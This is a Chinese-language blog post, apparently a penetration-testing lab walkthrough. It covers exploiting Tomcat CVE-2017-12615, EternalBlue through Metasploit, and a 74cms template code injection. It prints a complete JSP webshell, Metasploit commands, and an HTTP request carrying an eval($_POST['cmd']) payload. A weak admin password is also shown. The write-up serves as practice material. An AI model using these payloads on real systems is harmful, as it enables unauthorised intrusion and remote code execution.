@@ -1,0 +1,782 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/tuyi.jpg">
+  <link rel="icon" href="/img/tuyi.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="tuyi">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="开干场景介绍：重生之我是渗透测试工程师，被公司派遣去测试某网络的安全性。你的目标是成功获取所有服务器的权限，以评估网络安全状况。 连接vpn，扫描端口  发现其实cms，信息收集一下 fscan扫一下 12345678910111213141516171819202122232425262728293031323334[2025-04-03 11:46:48] [INFO] 加载的插件: find">
+<meta property="og:type" content="article">
+<meta property="og:title" content="cyberstrikelab_lab2">
+<meta property="og:url" content="https://tuyiisxp.github.io/2025/04/03/cyberstrikelab-lab2/">
+<meta property="og:site_name" content="tuyi的小站">
+<meta property="og:description" content="开干场景介绍：重生之我是渗透测试工程师，被公司派遣去测试某网络的安全性。你的目标是成功获取所有服务器的权限，以评估网络安全状况。 连接vpn，扫描端口  发现其实cms，信息收集一下 fscan扫一下 12345678910111213141516171819202122232425262728293031323334[2025-04-03 11:46:48] [INFO] 加载的插件: find">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250403111811126.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250403122959594.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250403123043272.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250403123119407.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250403123224794.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250403124829741.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250403112445766.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250403132250264.png">
+<meta property="article:published_time" content="2025-04-03T03:16:30.000Z">
+<meta property="article:modified_time" content="2025-04-03T05:27:17.453Z">
+<meta property="article:author" content="tuyi">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250403111811126.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>cyberstrikelab_lab2 - tuyi的小站</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+<link rel="stylesheet" href="/css/reward.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"tuyiisxp.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>tuyi的小站</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="cyberstrikelab_lab2"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-04-03 11:16" pubdate>
+          2025年4月3日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          10 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">cyberstrikelab_lab2</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2025年4月3日 下午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="开干"><a href="#开干" class="headerlink" title="开干"></a>开干</h1><h3 id="场景介绍："><a href="#场景介绍：" class="headerlink" title="场景介绍："></a>场景介绍：</h3><p>重生之我是渗透测试工程师，被公司派遣去测试某网络的安全性。你的目标是成功获取所有服务器的权限，以评估网络安全状况。</p>
+<p>连接vpn，扫描端口</p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250403111811126.png" srcset="/img/loading.gif" lazyload alt="image-20250403111811126"></p>
+<p>发现其实cms，信息收集一下</p>
+<p><code>fscan</code>扫一下</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-attr">[2025-04-03 11:46:48]</span> <span class="hljs-selector-attr">[INFO]</span> 加载的插件: <span class="hljs-selector-tag">findnet</span>, <span class="hljs-selector-tag">ms17010</span>, <span class="hljs-selector-tag">mysql</span>, <span class="hljs-selector-tag">netbios</span>, <span class="hljs-selector-tag">smb</span>, <span class="hljs-selector-tag">smb2</span>, <span class="hljs-selector-tag">smbghost</span>, <span class="hljs-selector-tag">ssh</span>, <span class="hljs-selector-tag">webpoc</span>, <span class="hljs-selector-tag">webtitle</span>         <br><span class="hljs-selector-attr">[2025-04-03 11:46:48]</span> <span class="hljs-selector-attr">[SUCCESS]</span> <span class="hljs-number">192.168</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.10</span> <span class="hljs-selector-tag">CVE-2020-0796</span> <span class="hljs-selector-tag">SmbGhost</span> <span class="hljs-selector-tag">Vulnerable</span>                                          <br><span class="hljs-selector-attr">[2025-04-03 11:46:48]</span> <span class="hljs-selector-attr">[SUCCESS]</span> <span class="hljs-selector-tag">NetInfo</span> 扫描结果                                                                             <br>目标主机: <span class="hljs-number">192.168</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.10</span>                                                                                                      <br>主机名: <span class="hljs-selector-tag">DESKTOP-JFB57A8</span>                                                                                                     <br>发现的网络接口:                                                                                                                 <br>   <span class="hljs-selector-tag">IPv4</span>地址:                                                                                                               <br>      └─ <span class="hljs-number">192.168</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.10</span>                                                                                                   <br><span class="hljs-selector-attr">[2025-04-03 11:46:48]</span> <span class="hljs-selector-attr">[SUCCESS]</span> <span class="hljs-selector-tag">NetInfo</span> 扫描结果                                                                             <br>目标主机: <span class="hljs-number">192.168</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.20</span>                                                                                                      <br>主机名: <span class="hljs-selector-tag">cyberweb</span>                                                                                                            <br>发现的网络接口:                                                                                                                 <br>   <span class="hljs-selector-tag">IPv4</span>地址:                                                                                                               <br>      └─ <span class="hljs-number">192.168</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.20</span>                                                                                                   <br><span class="hljs-selector-attr">[2025-04-03 11:46:48]</span> <span class="hljs-selector-attr">[SUCCESS]</span> 网站标题 <span class="hljs-selector-tag">https</span>:<span class="hljs-comment">//192.168.10.233:8080 状态码:404 长度:19     标题:无标题                                </span><br><span class="hljs-selector-attr">[2025-04-03 11:46:48]</span> <span class="hljs-selector-attr">[SUCCESS]</span> <span class="hljs-selector-tag">NetBios</span> <span class="hljs-number">192.168</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.20</span>   <span class="hljs-selector-tag">cyberweb</span><span class="hljs-selector-class">.cyberstrikelab</span><span class="hljs-selector-class">.com</span>         <span class="hljs-selector-tag">Windows</span> <span class="hljs-selector-tag">Server</span> <span class="hljs-number">2012</span> <span class="hljs-selector-tag">R2</span> <span class="hljs-selector-tag">Standa</span><br><span class="hljs-selector-tag">rd</span> <span class="hljs-number">9600</span>                                                                                                                  <br><span class="hljs-selector-attr">[2025-04-03 11:46:48]</span> <span class="hljs-selector-attr">[SUCCESS]</span> 网站标题 <span class="hljs-selector-tag">http</span>:<span class="hljs-comment">//192.168.10.20:8080 状态码:200 长度:11432  标题:Apache Tomcat/8.5.19                 </span><br><span class="hljs-selector-attr">[2025-04-03 11:46:50]</span> <span class="hljs-selector-attr">[SUCCESS]</span> 目标: <span class="hljs-selector-tag">http</span>:<span class="hljs-comment">//192.168.10.20:8080                                                            </span><br>  漏洞类型: <span class="hljs-selector-tag">poc-yaml-iis-put-getshell</span>                                                                                        <br>  漏洞名称:                                                                                                                  <br>  详细信息:                                                                                                                  <br>        <span class="hljs-selector-tag">author</span>:<span class="hljs-selector-tag">Cannae</span>(github.com/thunderbarca)                                                                           <br>        <span class="hljs-selector-tag">links</span>:<span class="hljs-selector-tag">https</span>:<span class="hljs-comment">//www.cnblogs.com/-mo-/p/11295400.html                                                               </span><br><span class="hljs-selector-attr">[2025-04-03 11:46:52]</span> <span class="hljs-selector-attr">[SUCCESS]</span> 网站标题 <span class="hljs-selector-tag">http</span>:<span class="hljs-comment">//192.168.10.10:808  状态码:200 长度:20287  标题:骑士PHP高端人才系统(www.74                   </span><br><span class="hljs-selector-tag">cms</span><span class="hljs-selector-class">.com</span>)                                                                                                                 <br><span class="hljs-selector-attr">[2025-04-03 11:46:53]</span> <span class="hljs-selector-attr">[SUCCESS]</span> 目标: <span class="hljs-selector-tag">http</span>:<span class="hljs-comment">//192.168.10.20:8080                                                            </span><br>  漏洞类型: <span class="hljs-selector-tag">poc-yaml-tomcat-cve-2017-12615-rce</span>                                                                               <br>  漏洞名称:                                                                                                                  <br>  详细信息:                                                                                                                  <br>        <span class="hljs-selector-tag">author</span>:<span class="hljs-selector-tag">j4ckzh0u</span>(<span class="hljs-attribute">https</span>:<span class="hljs-comment">//github.com/j4ckzh0u)                                                                     </span><br>        <span class="hljs-attribute">links</span>:<span class="hljs-attribute">https</span>:<span class="hljs-comment">//www.seebug.org/vuldb/ssvid-96562                                                                   </span><br><span class="hljs-attribute">https</span>:<span class="hljs-comment">//mp.weixin.qq.com/s/sulJSg0Ru138oASiI5cYAA                                                                        </span><br>                                                                                                                         <br></code></pre></td></tr></table></figure>
+
+<p>有两个站，先看看这个rce的cve  cve-2017-12615</p>
+<p>使用burpsuite抓包，修改GET为PUT上传方式，添加文件名1.jsp&#x2F;，添加shell脚本</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%!<br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">U</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ClassLoader</span> &#123;<br>        U(ClassLoader c) &#123;<br>            <span class="hljs-built_in">super</span>(c);<br>        &#125;<br>        <span class="hljs-keyword">public</span> Class <span class="hljs-title function_">g</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] b)</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.defineClass(b, <span class="hljs-number">0</span>, b.length);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] base64Decode(String str) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.misc.BASE64Decoder&quot;</span>);<br>            <span class="hljs-keyword">return</span> (<span class="hljs-type">byte</span>[]) clazz.getMethod(<span class="hljs-string">&quot;decodeBuffer&quot;</span>, String.class).invoke(clazz.newInstance(), str);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.util.Base64&quot;</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">decoder</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-string">&quot;getDecoder&quot;</span>).invoke(<span class="hljs-literal">null</span>);<br>            <span class="hljs-keyword">return</span> (<span class="hljs-type">byte</span>[]) decoder.getClass().getMethod(<span class="hljs-string">&quot;decode&quot;</span>, String.class).invoke(decoder, str);<br>        &#125;<br>    &#125;<br>%&gt;<br>&lt;%<br>    <span class="hljs-type">String</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;ant&quot;</span>);<br>    <span class="hljs-keyword">if</span> (cls != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">U</span>(<span class="hljs-built_in">this</span>.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250403122959594.png" srcset="/img/loading.gif" lazyload alt="image-20250403122959594"></p>
+<p>蚁剑连接</p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250403123043272.png" srcset="/img/loading.gif" lazyload alt="image-20250403123043272"></p>
+<p>拿到第一个flag</p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250403123119407.png" srcset="/img/loading.gif" lazyload alt="image-20250403123119407"></p>
+<p>看看网卡，发现是双网卡</p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250403123224794.png" srcset="/img/loading.gif" lazyload alt="image-20250403123224794"></p>
+<p>传<code>fscan</code>扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">[2025-04-03 04:35:59] [SERVICE] 目标:192.168.10.10 状态:identified 详情:port=808, service=http<br>[2025-04-03 04:35:59] [SERVICE] 目标:192.168.20.30 状态:identified 详情:hostname=WIN-7NRTJO59O7N, ipv4=[192.168.20.30], ipv6=[]<br>[2025-04-03 04:35:59] [SERVICE] 目标:192.168.20.20 状态:identified 详情:hostname=cyberweb, ipv4=[192.168.10.20], ipv6=[]<br>[2025-04-03 04:35:59] [SERVICE] 目标:192.168.20.20 状态:identified 详情:title=Apache Tomcat/8.5.19, url=http://192.168.20.20:8080, status_code=200, length=11432, server_info=map[content-type:text/html;charset=UTF-8 <span class="hljs-built_in">date</span>:Wed, 02 Apr 2025 20:35:59 GMT length:11432 status_code:200 title:Apache Tomcat/8.5.19], fingerprints=[], port=8080, service=http<br>[2025-04-03 04:35:59] [SERVICE] 目标:192.168.20.20 状态:identified 详情:domain_name=cyberstrikelab.com, netbios_domain=CYBERSTRIKELAB, netbios_computer=CYBERWEB, workstation_service=CYBERWEB, server_service=CYBERWEB, os_version=Windows Server 2012 R2 Standard 9600, port=139, computer_name=cyberweb.cyberstrikelab.com<br>[2025-04-03 04:36:00] [VULN] 目标:192.168.20.30 状态:vulnerable 详情:port=445, vulnerability=MS17-010, os=Windows Server 2008 R2 Standard 7600<br>[2025-04-03 04:36:00] [SERVICE] 目标:192.168.10.233 状态:identified 详情:port=8080, service=http, banner=HTTP/1.0 400 Bad Request.Client sent an HTTP request to an HTTPS server.<br>[2025-04-03 04:36:01] [SERVICE] 目标:192.168.10.20 状态:identified 详情:port=8080, service=http<br>[2025-04-03 04:36:01] [SERVICE] 目标:192.168.10.20 状态:identified 详情:port=8009, service=unknown<br>[2025-04-03 04:36:02] [SERVICE] 目标:192.168.10.10 状态:identified 详情:service=mysql, product=MySQL, info=unauthorized, banner=A.j Host <span class="hljs-string">&#x27;CYBERWEB&#x27;</span> is not allowed to connect to this MySQL server, port=3306<br>[2025-04-03 04:36:02] [VULN] 目标:http://192.168.20.20:8080 状态:vulnerable 详情:author=Cannae(github.com/thunderbarca), references=[https://www.cnblogs.com/-mo-/p/11295400.html], vulnerability_type=poc-yaml-iis-put-getshell, vulnerability_name=<br>[2025-04-03 04:36:03] [VULN] 目标:http://192.168.20.20:8080 状态:vulnerable 详情:vulnerability_type=poc-yaml-tomcat-cve-2017-12615-rce, vulnerability_name=, author=j4ckzh0u(https://github.com/j4ckzh0u), references=[https://www.seebug.org/vuldb/ssvid-96562 https://mp.weixin.qq.com/s/sulJSg0Ru138oASiI5cYAA]<br></code></pre></td></tr></table></figure>
+
+<p>看见<code>192.168.20.30</code>有个永恒之蓝</p>
+<p>搭建代理，用msf打</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">use auxiliary/admin/smb/ms17_010_command<br><span class="hljs-built_in">set</span> rhost 192.168.20.30<br><span class="hljs-built_in">set</span> <span class="hljs-built_in">command</span> <span class="hljs-built_in">type</span> C:\\flag.txt<br>run<br></code></pre></td></tr></table></figure>
+
+<p>拿到flag</p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250403124829741.png" srcset="/img/loading.gif" lazyload alt="image-20250403124829741"></p>
+<p>现在看看第二个站</p>
+<p>找到后台登录地址<code>/index.php?m=admin&amp;c=index&amp;a=login</code></p>
+<p>输入<code>admin</code>会提示<code>账号或密码错误</code>输入别的会提示<code>管理员账号不存在</code></p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250403112445766.png" srcset="/img/loading.gif" lazyload alt="image-20250403112445766"></p>
+<p>弱口令<code>admin:admin123456</code></p>
+<p>我们打后台模板代码注入漏洞！</p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250403132250264.png" srcset="/img/loading.gif" lazyload alt="image-20250403132250264"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /index.php?m=admin&amp;c=tpl&amp;a=set&amp;tpl_dir=&#x27;,&#x27;a&#x27;,eval($_POST[&#x27;cmd&#x27;]),&#x27; HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">192.168.10.10:808</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">124.0.0.0</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> Edg/<span class="hljs-number">124.0.0.0</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span><br><span class="hljs-attribute">Referer</span>: http://<span class="hljs-number">192.168.10.10:808</span>/index.php?m=admin&amp;c=tpl&amp;a=index<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate, br<br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,en-GB;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">6</span><br><span class="hljs-attribute">Cookie</span>: PHPSESSID=co56nmseg5pps6berl1iv3aa47; think_template=default; think_language=zh-CN<br><span class="hljs-attribute">Connection</span>: keep-alive<br></code></pre></td></tr></table></figure>
+
+<p>然后访问<code>/Application/Home/Conf/config.php</code></p>
+<p>蚁剑连接，拿到flag</p>
+<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">go-flag</span><span class="hljs-template-variable">&#123;MP9E4xXhya0TlzVF&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>简单</strong></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/cyberstrikelab/" class="category-chain-item">cyberstrikelab</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E9%9D%B6%E5%9C%BA/" class="print-no-link">#靶场</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>cyberstrikelab_lab2</div>
+      <div>https://tuyiisxp.github.io/2025/04/03/cyberstrikelab-lab2/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>tuyi</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年4月3日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2025年4月3日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/03/30/cyberstrikelab-pt1/" title="cyberstrikelab-pt1">
+                        <span class="hidden-mobile">cyberstrikelab-pt1</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
